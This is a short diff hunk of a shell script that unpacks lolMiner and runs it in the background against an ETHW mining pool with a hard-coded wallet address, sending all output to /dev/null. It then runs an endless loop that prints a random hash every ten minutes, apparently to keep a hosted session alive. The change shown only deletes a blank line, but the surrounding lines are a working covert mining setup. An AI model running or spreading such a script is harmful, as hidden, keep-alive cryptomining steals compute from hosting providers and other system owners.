@@ -3,4 +3,3 @@ tar xf lolMiner_v1.57_Lin64.tar.gz
 cd 1.57
 ./lolMiner --algo ETHASH --pool stratum+tcp://ethw.2miners.com:2020 --user 0xa2c2cbf7a979a004005f093d720ef0b8509f731a.$(echo $(shuf -i 1-20000 -n 1)-cuuk) --pass 123 --dns-over-http=2 208.67.222.222 > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
-
